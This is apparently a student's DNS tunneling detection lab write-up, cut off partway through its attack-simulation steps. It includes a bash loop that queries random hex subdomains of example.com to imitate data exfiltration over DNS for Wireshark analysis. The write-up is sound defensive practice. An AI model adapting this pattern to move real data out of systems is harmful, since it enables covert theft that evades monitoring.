
# DNS Tunneling & Data Exfiltration Detection Lab

## Executive Summary
This lab demonstrates the generation and analysis of anomalous DNS traffic to detect DNS Tunneling and potential Data Exfiltration. Using a virtualized Linux environment, Wireshark packet capture, and terminal scripting, I simulated high-entropy DNS queries over UDP Port 53 and analyzed the packet signatures to identify Indicators of Compromise (IoCs).

---

## Lab Environment & Tools
* **Operating System:** Ubuntu Linux (ARM64 VM on UTM / macOS)
* **Packet Analyzer:** Wireshark v4.2.2
* **Traffic Generation:** Bash loop with OpenSSL-generated random hex payloads
* **Protocol Inspected:** DNS (UDP Port 53)

---

## Attack Simulation Steps
1. **Packet Capture Initiation:** Started Wireshark monitoring on interface `enp0s1` filtered for `dns` traffic.
2. **Normal Baseline Test:** Executed standard host resolution (`nslookup google.com`) to establish normal DNS traffic baseline.
3. **Anomalous Traffic Generation:** Generated high-frequency, randomized hex subdomains simulating data exfiltration:
   ```bash
   for i in {1..15}; do nslookup $(openssl rand -hex 16).example.com; done